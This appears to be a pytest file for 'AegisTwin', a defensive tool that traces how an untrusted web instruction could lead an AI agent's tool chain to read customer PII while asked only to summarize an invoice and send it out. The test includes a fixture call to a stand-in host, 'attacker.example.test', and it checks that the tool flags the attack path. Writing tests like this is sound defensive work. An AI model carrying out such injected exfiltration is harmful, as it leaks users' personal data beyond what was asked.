from datetime import datetime, timezone

from app.contracts import (
    DataArtifact,
    InstructionOrigin,
    RiskLevel,
    ToolCall,
    ToolProfile,
)

from app.twin.attack_paths import (
    discover_attack_paths,
)

from app.twin.capability_map import (
    build_capability_map,
)

from app.twin.drift import (
    analyze_behavioral_drift,
)

from app.twin.graph import (
    build_twin_graph,
)

from app.twin.intent_action import (
    analyze_intent_action,
)

from app.twin.least_privilege import (
    analyze_least_privilege,
)

from app.twin.lineage import (
    contains_sensitive_lineage,
    create_derived_artifact,
)

from app.twin.provenance import (
    analyze_tool_call_provenance,
)


def make_profile(
    *,
    tool_name: str,
    capabilities: set[str],
    observed_effects: set[str],
    risk_level: RiskLevel,
    behavioral_mismatch: bool = False,
    fingerprint: str | None = None,
) -> ToolProfile:
    return ToolProfile(
        tool_name=tool_name,
        version="1.0",
        declared_effects=set(
            observed_effects
        ),
        observed_effects=(
            observed_effects
        ),
        capabilities=capabilities,
        risk_level=risk_level,
        behavioral_mismatch=(
            behavioral_mismatch
        ),
        fingerprint=(
            fingerprint
            or f"fingerprint-{tool_name}"
        ),
    )


def test_complete_aegistwin_attack_detection_pipeline():
    """
    Full AegisTwin hackathon attack scenario.

    User asks only to summarize an invoice.

    An untrusted instruction causes customer data
    to flow through the summarizer and toward an
    external HTTP destination.

    AegisTwin must identify the attack as CRITICAL.
    """

    original_intent = (
        "Summarize this invoice"
    )

    # --------------------------------------------------
    # 1. TOOL MRI / CAPABILITY PROFILES
    # --------------------------------------------------

    invoice_reader = make_profile(
        tool_name="invoice_reader",
        capabilities={
            "filesystem_access",
        },
        observed_effects={
            "READ_INVOICE",
        },
        risk_level=RiskLevel.MEDIUM,
    )

    customer_database = make_profile(
        tool_name="customer_database",
        capabilities={
            "database_access",
            "sensitive_data_access",
            "external_communication",
        },
        observed_effects={
            "READ_CUSTOMER_PII",
        },
        risk_level=RiskLevel.CRITICAL,
    )

    summarizer = make_profile(
        tool_name="summarizer",
        capabilities=set(),
        observed_effects={
            "SUMMARIZE_DATA",
        },
        risk_level=RiskLevel.LOW,
    )

    external_http = make_profile(
        tool_name="external_http",
        capabilities={
            "external_communication",
        },
        observed_effects={
            "SEND_HTTP_REQUEST",
        },
        risk_level=RiskLevel.HIGH,
    )

    profiles = [
        invoice_reader,
        customer_database,
        summarizer,
        external_http,
    ]

    # --------------------------------------------------
    # 2. CAPABILITY MAP
    # --------------------------------------------------

    capability_map = (
        build_capability_map(
            profiles
        )
    )

    assert (
        capability_map[
            "summary"
        ]["total_tools"]
        == 4
    )

    assert (
        capability_map[
            "summary"
        ][
            "external_communication_tools"
        ]
        == 2
    )

    # --------------------------------------------------
    # 3. UNTRUSTED INSTRUCTION PROVENANCE
    # --------------------------------------------------

    malicious_call = ToolCall(
        call_id="call-db-001",
        session_id="session-demo",
        tool_name="customer_database",
        arguments={
            "customer_id": "CUST-001",
        },
        instruction_origin=(
            InstructionOrigin.WEB_UNTRUSTED
        ),
        original_user_intent=(
            original_intent
        ),
        timestamp=datetime.now(
            timezone.utc
        ),
    )

    provenance = (
        analyze_tool_call_provenance(
            malicious_call,
            requested_effect=(
                "EXTERNAL_TRANSFER"
            ),
        )
    )

    assert (
        provenance["trusted"]
        is False
    )

    assert (
        provenance[
            "can_authorize_sensitive_action"
        ]
        is False
    )

    assert (
        provenance["risk_level"]
        == "CRITICAL"
    )

    # --------------------------------------------------
    # 4. DATA LINEAGE
    # --------------------------------------------------

    customer_record = DataArtifact(
        artifact_id="customer-record",
        value={
            "name": "Demo Customer",
            "email": (
                "demo@example.test"
            ),
        },
        labels={
            "CustomerPII",
        },
        parent_artifact_ids=set(),
        transformation=None,
    )

    summary = create_derived_artifact(
        artifact_id="summary",
        value="Invoice summary",
        parent_artifacts=[
            customer_record,
        ],
        transformation="summarizer",
    )

    assert (
        contains_sensitive_lineage(
            summary
        )
        is True
    )

    assert (
        "DerivedFrom<CustomerPII>"
        in summary.labels
    )

    outbound_payload = (
        create_derived_artifact(
            artifact_id=(
                "outbound-payload"
            ),
            value="Payload",
            parent_artifacts=[
                summary
            ],
            transformation=(
                "external_http"
            ),
        )
    )

    assert (
        contains_sensitive_lineage(
            outbound_payload
        )
        is True
    )

    # --------------------------------------------------
    # 5. INTENT VS ACTION
    # --------------------------------------------------

    intent_analysis = (
        analyze_intent_action(
            original_intent=(
                original_intent
            ),
            final_effect=(
                "EXTERNAL_TRANSFER"
            ),
            destination=(
                "EXTERNAL"
            ),
        )
    )

    assert (
        intent_analysis["aligned"]
        is False
    )

    assert (
        intent_analysis["risk_level"]
        == "CRITICAL"
    )

    # --------------------------------------------------
    # 6. DIGITAL TWIN GRAPH
    # --------------------------------------------------

    external_call = ToolCall(
        call_id="call-http-001",
        session_id="session-demo",
        tool_name="external_http",
        arguments={
            "destination": (
                "https://attacker.example.test"
            ),
        },
        instruction_origin=(
            InstructionOrigin.MCP_TOOL_OUTPUT
        ),
        original_user_intent=(
            original_intent
        ),
        timestamp=datetime.now(
            timezone.utc
        ),
    )

    graph = build_twin_graph(
        profiles=profiles,
        calls=[
            malicious_call,
            external_call,
        ],
        artifacts=[
            customer_record,
            summary,
            outbound_payload,
        ],
    )

    assert len(
        graph.nodes
    ) > 0

    assert len(
        graph.edges
    ) > 0

    # --------------------------------------------------
    # 7. ATTACK PATH DISCOVERY
    # --------------------------------------------------

    attacks = discover_attack_paths(
        graph,
        final_effect=(
            "EXTERNAL_TRANSFER"
        ),
        destination="EXTERNAL",
        evidence_receipt_ids=[
            "receipt-db-001",
            "receipt-http-001",
        ],
    )

    assert len(attacks) == 1

    attack = attacks[0]

    assert (
        attack.risk_level
        == RiskLevel.CRITICAL
    )

    assert (
        attack.original_intent
        == original_intent
    )

    assert (
        attack.instruction_origin
        == InstructionOrigin.WEB_UNTRUSTED
    )

    assert (
        "CustomerPII"
        in attack.source_labels
    )

    assert (
        "DerivedFrom<CustomerPII>"
        in attack.source_labels
    )

    assert (
        "tool:external_http"
        in attack.path
    )

    assert (
        "destination:EXTERNAL"
        in attack.path
    )

    # --------------------------------------------------
    # 8. LEAST PRIVILEGE
    # --------------------------------------------------

    least_privilege = (
        analyze_least_privilege(
            customer_database,
            legitimate_effects={
                "READ_CUSTOMER_PII",
            },
        )
    )

    assert (
        "external_communication"
        in least_privilege[
            "removable_capabilities"
        ]
    )

    assert (
        least_privilege[
            "least_privilege_satisfied"
        ]
        is False
    )

    # --------------------------------------------------
    # 9. BEHAVIORAL DRIFT
    # --------------------------------------------------

    old_invoice_reader = (
        make_profile(
            tool_name=(
                "invoice_reader"
            ),
            capabilities={
                "filesystem_access",
            },
            observed_effects={
                "READ_INVOICE",
            },
            risk_level=(
                RiskLevel.MEDIUM
            ),
            fingerprint="old",
        )
    )

    changed_invoice_reader = (
        make_profile(
            tool_name=(
                "invoice_reader"
            ),
            capabilities={
                "filesystem_access",
                "sensitive_data_access",
                "external_communication",
            },
            observed_effects={
                "READ_INVOICE",
                "SEND_HTTP_REQUEST",
            },
            risk_level=(
                RiskLevel.CRITICAL
            ),
            behavioral_mismatch=True,
            fingerprint="new",
        )
    )

    drift = (
        analyze_behavioral_drift(
            old_invoice_reader,
            changed_invoice_reader,
        )
    )

    assert (
        drift["drift_detected"]
        is True
    )

    assert (
        drift["severity"]
        == "CRITICAL"
    )

    assert (
        drift["should_quarantine"]
        is True
    )

    assert (
        drift["retest_required"]
        is True
    )


def test_legitimate_internal_summary_remains_safe():
    """
    Regression test proving that AegisTwin does not
    block the legitimate invoice-summary workflow.
    """

    intent = (
        "Summarize this invoice"
    )

    customer = DataArtifact(
        artifact_id="customer-safe",
        value={
            "name": "Demo Customer"
        },
        labels={
            "CustomerPII",
        },
        parent_artifact_ids=set(),
        transformation=None,
    )

    summary = create_derived_artifact(
        artifact_id="summary-safe",
        value="Internal summary",
        parent_artifacts=[
            customer
        ],
        transformation="summarizer",
    )

    summarizer = make_profile(
        tool_name="summarizer",
        capabilities=set(),
        observed_effects={
            "SUMMARIZE_DATA",
        },
        risk_level=RiskLevel.LOW,
    )

    safe_call = ToolCall(
        call_id="call-safe-001",
        session_id="session-safe",
        tool_name="summarizer",
        arguments={},
        instruction_origin=(
            InstructionOrigin.USER
        ),
        original_user_intent=intent,
        timestamp=datetime.now(
            timezone.utc
        ),
    )

    graph = build_twin_graph(
        profiles=[
            summarizer
        ],
        calls=[
            safe_call
        ],
        artifacts=[
            customer,
            summary,
        ],
    )

    attacks = discover_attack_paths(
        graph,
        final_effect=(
            "SUMMARIZE_DATA"
        ),
        destination=None,
    )

    assert attacks == []

    assert (
        contains_sensitive_lineage(
            summary
        )
        is True
    )